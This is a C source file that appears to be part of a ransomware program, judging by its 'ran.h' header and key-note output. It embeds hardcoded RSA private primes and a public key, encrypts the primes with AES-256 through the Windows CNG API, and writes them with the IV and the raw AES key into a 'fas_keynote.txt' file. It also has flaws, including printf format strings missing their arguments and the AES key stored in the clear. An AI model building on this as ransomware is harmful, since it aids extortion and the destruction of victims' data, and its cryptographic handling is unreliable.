#include "ran.h"

DWORD aes_ciphertextLength = 0; // Length of the ciphertext
BYTE p[256] = { 0xc9, 0x63, 0x68, 0x49, 0x1e, 0xb2, 0x6a, 0x53, 0x87, 0xa1, 0x12, 0x3c, 0xf0, 0x3d, 0xf6, 0xe3, 0xa7, 0xa0, 0xaf, 0x5f, 0x9c, 0xb6, 0xbc, 0x8e, 0xea, 0x00, 0xf0, 0x35, 0x96, 0xdc, 0x24, 0xb6, 0xe9, 0x80, 0xdc, 0xc3, 0xd1, 0x3d, 0x4a, 0x47, 0x90, 0x18, 0xeb, 0xf0, 0xc0, 0x7f, 0xa9, 0x4f, 0x48, 0xd4, 0x26, 0x74, 0xad, 0x68, 0xbb, 0x46, 0x1a, 0x6f, 0xfd, 0x72, 0xe4, 0xc1, 0x5a, 0x76, 0x3e,
    0x28, 0x07, 0xeb, 0xe9, 0x24, 0xa1, 0x3b, 0x61, 0xe6, 0xef, 0xd4, 0x86, 0x5c, 0x76, 0x57, 0x7b, 0xd9, 0xc1, 0xb1, 0x15, 0xe8, 0x1d, 0x46, 0xd3, 0x52, 0x54, 0x10, 0xe5, 0x42, 0x66, 0xa2, 0x38, 0xcf, 0xa2, 0x11, 0xff, 0x6b, 0xd1, 0x00, 0x4b, 0x2d, 0xc0, 0x7f, 0x0f, 0x46, 0x0d, 0xd1, 0xc9, 0x52, 0xb9, 0xcc, 0xdb, 0x87, 0xfb, 0x4a, 0xa1, 0x4d, 0x48, 0x22, 0x91, 0x69, 0xd0, 0x05, 0xf0, 0x67, 0x75, 0xa2, 0xff, 0x7f, 0x42, 0xc2, 0x8d, 0x08, 0xa3, 0x49, 0xc3, 0x14, 0x14, 0x07, 0x1c, 0xc5, 0x69, 0x64, 0xf2, 0x76, 0x21, 0x11, 0x66, 0xba, 0xbb, 0xfd, 0x96, 0xb0, 0x19, 0xd5, 0xb1, 0x37, 0x5f, 0x11, 0x1f, 0x0a, 0x81, 0xfb, 0x4b, 0x8d, 0xfb, 0x21,
    0x38, 0x3a, 0x36, 0x09, 0x3d, 0x20, 0xed, 0xea, 0x62, 0xbd, 0x8d, 0xf4, 0xf0, 0xbe, 0xbf, 0xa6, 0x8a, 0xe8, 0xe1, 0x98, 0x90, 0xb7, 0x36, 0xfa, 0xb5, 0x97, 0x77, 0xb1, 0x55, 0xe6, 0x63, 0xbb, 0x63, 0x94, 0x49, 0xc9, 0x34, 0x8b, 0xd5, 0x0c, 0x1f, 0xea, 0xf8, 0xee, 0xf1, 0x87, 0x7d, 0xcd, 0x33, 0xa0, 0x6f, 0x46, 0x04, 0x9d, 0xbf, 0xcc, 0x31, 0x93, 0x70, 0xa6, 0x6b, 0x09, 0xa8, 0x70, 0xd7, 0x1c, 0x11, 0xf4, 0x27, 0x4c, 0x86, 0xca, 0x86, 0xbc, 0x90, 0xff, 0xf5, 0xd3, 0x63, 0x22, 0x5c, 0x63, 0x69, 0xc3 }; // private key p

BYTE q[256] = { 0xd9, 0x29, 0xd1, 0x4c, 0x16, 0x47, 0xe8, 0xc5, 0x45, 0x58, 0x74, 0x98,
    0x37, 0x3f, 0xef, 0x45, 0xe3, 0x7e, 0x8b, 0x74, 0xf6, 0x70, 0xd1, 0x71,
    0xd3, 0x46, 0xd2, 0x75, 0xdf, 0xd1, 0x11, 0x6b, 0x32, 0x11, 0xa9, 0xde,
    0xc0, 0xcf, 0xe3, 0x65, 0x4e, 0x0a, 0x19, 0xf4, 0x28, 0x1e, 0xdf, 0xef,
    0xd0, 0xc8, 0xae, 0xc1, 0x63, 0x65, 0xa2, 0x09, 0xdc, 0x5c, 0x62, 0xe4,
    0x05, 0xde, 0x8d, 0x3f, 0x06, 0xc8, 0x09, 0x5d, 0x2f, 0xf7, 0xca, 0xe6,
    0x7a, 0xfd, 0xf1, 0x83, 0xfc, 0xca, 0xc4, 0x33, 0x10, 0xf3, 0xc6, 0xc1,
    0xe1, 0xf9, 0x27, 0x9e, 0x12, 0x03, 0x98, 0x60, 0x15, 0xf3, 0x4c, 0xf8,
    0xe0, 0xee, 0x38, 0xc6, 0x63, 0x18, 0x2f, 0xc8, 0x6c, 0x47, 0xdd, 0xff,
    0xc3, 0x28, 0x11, 0xe5, 0x2c, 0x52, 0x8d, 0x68, 0xe5, 0x40, 0x2b, 0xba,
    0x9d, 0x0d, 0xe6, 0x3c, 0xd2, 0x2b, 0xb7, 0xe1, 0xc0, 0x7d, 0xfd, 0x12,
    0x83, 0xc7, 0x16, 0x29, 0x55, 0x0a, 0x8b, 0x8f, 0x2b, 0x52, 0x68, 0x73,
    0x4e, 0xbb, 0xb4, 0x69, 0x52, 0xe5, 0x05, 0xe5, 0xb7, 0xea, 0xd6, 0x72,
    0x9d, 0x51, 0xe4, 0x94, 0x8e, 0x56, 0x41, 0x48, 0x97, 0x06, 0x68, 0xad,
    0x41, 0xb0, 0x7a, 0x4e, 0xb0, 0x2a, 0xf3, 0xd2, 0xf6, 0x02, 0x86, 0xeb,
    0x26, 0xc5, 0x89, 0x79, 0xb5, 0x4e, 0x15, 0x0a, 0x22, 0xbe, 0x88, 0x78,
    0xb9, 0x17, 0x2a, 0x81, 0x9e, 0x1c, 0x5c, 0xd1, 0x00, 0x6a, 0x06, 0x9c,
    0xc6, 0x7d, 0x14, 0x73, 0x8b, 0xfd, 0xc4, 0x69, 0xd2, 0x9b, 0x4d, 0xf0,
    0xd4, 0xae, 0x28, 0x87, 0x79, 0x2e, 0x6f, 0xe3, 0xdf, 0x6a, 0x94, 0xc8,
    0x28, 0xe9, 0x9f, 0xcc, 0xe4, 0x7b, 0x72, 0xf0, 0xce, 0x4d, 0xca, 0x52,
    0x37, 0x8c, 0x3f, 0x55, 0x4c, 0x58, 0xa8, 0x39, 0x08, 0xfd, 0x5a, 0xc3,
    0x41, 0x9e, 0x12, 0x97 }; // private key q

BYTE pub_e[3] = { 0x01, 0x00, 0x01 };
BYTE pub_n[512] = { 0xaa, 0xd6, 0x28, 0xf7, 0xb1, 0xe8, 0xeb, 0x1e, 0x16, 0x97, 0xc1, 0x7d, 0xa9,
    0xbc, 0x7d, 0x45, 0x5a, 0x9f, 0x64, 0x67, 0x76, 0x65, 0x9d, 0x1a, 0xc1, 0xd1,
    0xfb, 0x8f, 0x8c, 0xfe, 0xcb, 0xaf, 0x88, 0x2d, 0xe7, 0x88, 0x0b, 0x5b, 0xc9,
    0x89, 0x83, 0xc6, 0x2d, 0x2e, 0xb4, 0x9b, 0x19, 0x75, 0xb2, 0x97, 0xab, 0x61,
    0xc2, 0xc1, 0xfc, 0x89, 0x49, 0x67, 0x8b, 0xd9, 0xd1, 0x3f, 0xb5, 0x3a, 0x9c,
    0xaa, 0x2f, 0x11, 0x19, 0x07, 0x11, 0xf7, 0x63, 0x87, 0xe9, 0xeb, 0x7c, 0x1d,
    0xaa, 0x00, 0x95, 0xb7, 0x3f, 0xc0, 0xb5, 0x50, 0x5e, 0x2a, 0xa7, 0x44, 0x41,
    0x22, 0x2e, 0x29, 0x9c, 0xc3, 0xb5, 0x0e, 0xb3, 0x89, 0x90, 0x0b, 0x7d, 0xb3,
    0xf3, 0xc4, 0xb3, 0xc6, 0x2e, 0x51, 0x33, 0x2f, 0xf0, 0xf2, 0x1e, 0x60, 0xbf,
    0x44, 0x3b, 0x9f, 0xdc, 0x37, 0x9f, 0xdd, 0x59, 0xf7, 0x80, 0x2e, 0xc3, 0xe4,
    0x4a, 0xb5, 0x9e, 0x5e, 0x07, 0x21, 0x03, 0x47, 0xec, 0x9c, 0xee, 0x1b, 0x8b,
    0x7d, 0x60, 0xdc, 0x1c, 0xaa, 0x4d, 0x21, 0x78, 0xa9, 0x2d, 0x67, 0xe4, 0x68,
    0x35, 0xce, 0x55, 0x87, 0x05, 0x87, 0x16, 0xbf, 0x84, 0x50, 0xaf, 0x8b, 0x23,
    0x5d, 0xfc, 0xf9, 0xd4, 0x89, 0x47, 0x57, 0xa5, 0x25, 0x32, 0x54, 0x57, 0x59,
    0xcb, 0x1b, 0x77, 0x1b, 0x83, 0x0b, 0x90, 0x10, 0x4e, 0x3a, 0xd6, 0xa1, 0x30,
    0x9c, 0x71, 0x74, 0x9b, 0x80, 0x38, 0x6c, 0x9d, 0xe7, 0xc7, 0x4a, 0xa7, 0x08,
    0xc5, 0x0e, 0x6b, 0x18, 0x44, 0x0e, 0x0e, 0xbb, 0x78, 0xa1, 0x46, 0x85, 0x40,
    0xcc, 0x25, 0x9f, 0x84, 0xc8, 0x81, 0x8d, 0xb5, 0xca, 0xa2, 0xdb, 0xeb, 0xdf,
    0x3f, 0xa2, 0x39, 0xfc, 0x60, 0xd6, 0x05, 0x89, 0x24, 0x99, 0x68, 0x63, 0xa0,
    0x01, 0x46, 0x6d, 0x2f, 0x1a, 0x7b, 0x8c, 0x9b, 0x3f, 0x7d, 0x5d, 0x8d, 0xb5,
    0x0e, 0xe3, 0x85, 0xbb, 0x6f, 0x72, 0x1c, 0xfc, 0xc7, 0x62, 0x20, 0x82, 0xe0,
    0xec, 0xed, 0xc8, 0xe1, 0x2c, 0x6e, 0xd0, 0xa1, 0xea, 0xf0, 0xc2, 0xec, 0x55,
    0x7a, 0xf6, 0x90, 0x12, 0x23, 0x4f, 0x01, 0x1f, 0xf4, 0x4b, 0x79, 0xc2, 0xd4,
    0x11, 0x6d, 0xa5, 0x99, 0x27, 0xc1, 0xfe, 0xf7, 0x41, 0x66, 0x12, 0xde, 0xd9,
    0x7b, 0x04, 0xff, 0xd1, 0xf9, 0x05, 0xb7, 0xd7, 0x16, 0x0c, 0x2f, 0x34, 0x5e,
    0x14, 0xd3, 0x8b, 0xa3, 0xb2, 0x19, 0xfa, 0x2e, 0xdd, 0xcf, 0xcd, 0xc3, 0xa3,
    0x4c, 0x58, 0xb0, 0x55, 0x31, 0x3b, 0x25, 0xda, 0x0e, 0x0e, 0xbd, 0x21, 0xc4,
    0x3c, 0x2f, 0x12, 0xb6, 0xb4, 0x4b, 0xad, 0x83, 0xa7, 0xfa, 0x1f, 0x09, 0x41,
    0x6f, 0xb9, 0x96, 0x32, 0xe7, 0x13, 0x0b, 0x7f, 0xb5, 0x88, 0xb7, 0xd3, 0x5a,
    0xd8, 0x91, 0x3f, 0x52, 0x62, 0x8a, 0x94, 0x15, 0xc9, 0x2d, 0x23, 0xd6, 0xc8,
    0x5e, 0xc6, 0x1e, 0x3e, 0xf4, 0xa1, 0x32, 0xc6, 0xcb, 0xcb, 0x2e, 0x0e, 0xbd,
    0xe8, 0xc5, 0xf1, 0xdc, 0x1b, 0xb9, 0x7b, 0x4b, 0x97, 0xa3, 0x78, 0x8a, 0x5c,
    0x62, 0xc8, 0x26, 0xd5, 0xc9, 0x04, 0x81, 0x6c, 0xee, 0x1c, 0xdd, 0xe0, 0x7b,
    0x7d, 0xce, 0xd9, 0xf3, 0xfa, 0xb2, 0x0d, 0xfe, 0xb7, 0x5c, 0xb0, 0xe6, 0x71,
    0xb7, 0x52, 0x84, 0xd1, 0x67, 0xdf, 0x6e, 0x6c, 0x41, 0xce, 0xa3, 0x3c, 0x0a,
    0x50, 0xc7, 0xcd, 0xce, 0xbe, 0xe8, 0x35, 0xa2, 0x41, 0xe7, 0xf4, 0x3b, 0xcf,
    0xd3, 0xf8, 0x2d, 0xf6, 0x34, 0x89, 0x92, 0x7f, 0x29, 0x4e, 0x17, 0x6a, 0xd4,
    0xac, 0x98, 0x88, 0xd7, 0x9e, 0x5c, 0x76, 0xc1, 0xd0, 0xc2, 0xb0, 0xe2, 0xce,
    0xe1, 0xdc, 0x02, 0x1d, 0xc4, 0x20, 0xe2, 0x19, 0x70, 0x85, 0xb5, 0xf1, 0x44,
    0x82, 0x45, 0x6d, 0x18, 0x05 };

#define BLOCK_SIZE 16 // AES block size in bytes
#define AES_KEY_SIZE 32 // AES-256 key size in bytes

void pri_enc(unsigned char* plain, unsigned char* key, unsigned char* IV, BYTE* cipher)
{
    BYTE plaintext[256]; // plaintext to be encrypted
    memcpy(plaintext, plain, 256);

    PBYTE ciphertext = NULL; // ciphertext

    BYTE AES256Key[32]; // AES-256 key
    memcpy(AES256Key, key, 32);

    BYTE iv[16] = { 0, };
    memcpy(iv, IV, 16); // After Encrypt/Decrypt, iv is overwritten

    BCRYPT_ALG_HANDLE ALG_HANDLE = NULL;
    NTSTATUS status = 0;

    status = BCryptOpenAlgorithmProvider(
        &ALG_HANDLE,                 // Address of Algorithm Handle
        BCRYPT_AES_ALGORITHM,       // Cryptographic Algorithm Name
        NULL,                       // Not Use
        0);                         // Flags
    if (!NT_SUCCESS(status)) {
        printf("Error getting algorithm handle.\n");
        return;
    }

    BCRYPT_KEY_HANDLE KEY_HANDLE = NULL;        // AES Key Handle
    DWORD IVLength = 0;                         // IV Length 
    DWORD BlockLength = 0;                      // Block Length 
    DWORD bufferSize = 0;                       // Size of buffer 

    status = BCryptGenerateSymmetricKey(
        ALG_HANDLE,         // Algorithm Provider Handle
        &KEY_HANDLE,        // A pointer to Key Handle
        NULL,               // 
        0,                  // 
        AES256Key,          // A pointer to a buffer that contains the key material 
        sizeof(AES256Key),  // Size of the buffer that contains the key material 
        0);                 // Flags 
    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n BCryptGenerateSymmetricKey fail\n");
        BCryptDestroyKey(KEY_HANDLE);
        return;
    }

    status = BCryptSetProperty(
        KEY_HANDLE,                      // CNG HANDLE
        BCRYPT_CHAINING_MODE,            // Property name s
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,    // Buffer that contains new property value 
        sizeof(BCRYPT_CHAIN_MODE_CBC),   // Size of the buffer that contains new propety value 
        0);                              // Flags 
    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n BCryptSetProperty fail\n");
        BCryptDestroyKey(KEY_HANDLE);
        return;
    }

    status = BCryptGetProperty(
        ALG_HANDLE,              // CNG HANDLE
        BCRYPT_BLOCK_LENGTH,     // Property name 
        (PBYTE)&IVLength,       // Buffer which receives the property value 
        sizeof(DWORD),           // Size of the buffer which receives the property value 
        &bufferSize,             // Number of bytes that wer copied into the buffer 
        0);                      // Flags 
    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n BCryptGetProperty fail\n");
        BCryptDestroyKey(KEY_HANDLE);
        return;
    }

    status = BCryptEncrypt(                         // Calculate ciphertext length
        KEY_HANDLE,              // KEY HANDLE 
        plaintext,               // Address of the buffer that contains the plain text 
        sizeof(plaintext),       // Size of the buffer that contains the plain text 
        NULL,                    // A pointer to padding info used with asymetric
        iv,                      // Address of the buffer that contains the Initial Vector 
        IVLength,                // Size of the buffer that contains the Initial Vector
        NULL,                    // Address of the buffer that receives the ciphertext. 
        0,                       // Size of the buffer that receives the ciphertext 
        &aes_ciphertextLength,       // Variable that receives number of bytes copied to ciphertext buffer
        BCRYPT_BLOCK_PADDING);   // Flags : Block Padding 
    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n BCryptEncrypt(Calculate ciphertextLength) fail\n");
        BCryptDestroyKey(KEY_HANDLE);
        return;
    }
    else
    {
        ciphertext = (PBYTE)calloc(aes_ciphertextLength, sizeof(BYTE));        // Free needed
        if (ciphertext == NULL)
        {
            printf("Memory Allocation(ciphertext) Fail...\n");
            BCryptDestroyKey(KEY_HANDLE);
            return;
        }
    }

    status = BCryptEncrypt(                         // Encrypt Data
        KEY_HANDLE,              // KEY HANDLE 
        plaintext,               // Address of the buffer that contains the plain text 
        sizeof(plaintext),       // Size of the buufer that contains the plain text 
        NULL,                    // A pointer to padding info used with asymetric
        iv,                      // Address of the buffer that contains the Initial Vector 
        IVLength,                // Size of the buffer that contains the Initial Vector
        ciphertext,              // Address of the buffer that receives the ciphertext. 
        aes_ciphertextLength,        // Size of the buffer that receives the ciphertext 
        &bufferSize,             // Variable that receives number of bytes copied to ciphertext buffer
        BCRYPT_BLOCK_PADDING);   // Flags : Block Padding 
    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n BCryptEncrypt(Encrypt Data) fail\n");
        BCryptDestroyKey(KEY_HANDLE);
        free(ciphertext);
        return;
    }

    memcpy(cipher, ciphertext, aes_ciphertextLength);
    BCryptDestroyKey(KEY_HANDLE);
    free(ciphertext);
    aes_ciphertextLength = 0;
}

void make_key_note(unsigned char* key, unsigned char* iv)
{
    const char* filename = "fas_keynote.txt"; // name of the keynote file
    unsigned char rand[64];
    gen_key(rand, 512);

    unsigned char cipher_p[272];
    unsigned char cipher_q[272];

    pri_enc(p, key, iv, cipher_p); // Encrypt p
    pri_enc(q, key, iv, cipher_q); // Encrypt q

    FILE* fp = fopen(filename, "wb"); // Open the file
    if (fp == NULL) {
        printf("ERROR!\n");
        return;
    }

    fwrite(rand, sizeof(char), 64, fp); // Write the random key to the file

    fwrite(cipher_p, sizeof(char), 272, fp);

    fwrite(cipher_q, sizeof(char), 272, fp);

    fwrite(iv, sizeof(char), 16, fp);

    fprintf(fp, "##e: "); // Write public key to the file
    fwrite(pub_e, sizeof(char), 3, fp);

    fprintf(fp, "##n: "); // Write public key to the file
    fwrite(pub_n, sizeof(char), 512, fp);

    fwrite(key, sizeof(char), 32, fp);

    fclose(fp);
}